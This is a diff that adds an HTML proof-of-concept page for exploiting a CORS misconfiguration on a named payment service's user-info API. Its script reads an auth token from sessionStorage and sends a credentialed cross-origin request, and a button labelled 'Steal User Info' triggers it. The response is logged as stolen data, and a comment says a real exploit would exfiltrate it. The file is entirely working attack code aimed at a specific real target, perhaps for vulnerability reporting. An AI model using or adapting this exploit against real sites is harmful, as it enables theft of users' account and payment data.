@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>PoC to Exploit CORS Misconfiguration</h1>
+    <button onclick="stealData()">Steal User Info</button>
+
+    <script>
+        function getAuthToken() {
+            // Retrieve token from sessionStorage
+            return sessionStorage.getItem('token');
+        }
+
+        function stealData() {
+            const authToken = getAuthToken();
+
+            if (!authToken) {
+                console.error("Authorization token not found in session storage.");
+                return;
+            }
+
+            fetch("https://payment.tokomodal.id/api/v1/dashboard/user-info", {
+                method: "GET",
+                headers: {
+                    "Authorization": `Bearer ${authToken}`, // Dynamic token value from session storage
+                    "Accept-Language": "en-US",
+                    "Sec-CH-UA": '"Chromium";v="127", "Not)A;Brand";v="99"',
+                    "Sec-CH-UA-Mobile": "?1",
+                    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Mobile Safari/537.36",
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "Sec-CH-UA-Platform": '"Android"',
+                    "Sec-Fetch-Site": "same-origin",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Dest": "empty",
+                    "Referer": "https://payment.tokomodal.id/dashboard",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Priority": "u=1, i"
+                },
+                credentials: "include" // Ensures cookies are sent along with the request
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error("Network response was not ok.");
+            })
+            .then(data => {
+                console.log("Stolen User Info:", data); // Log sensitive data for testing; in real exploit, data would be exfiltrated
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
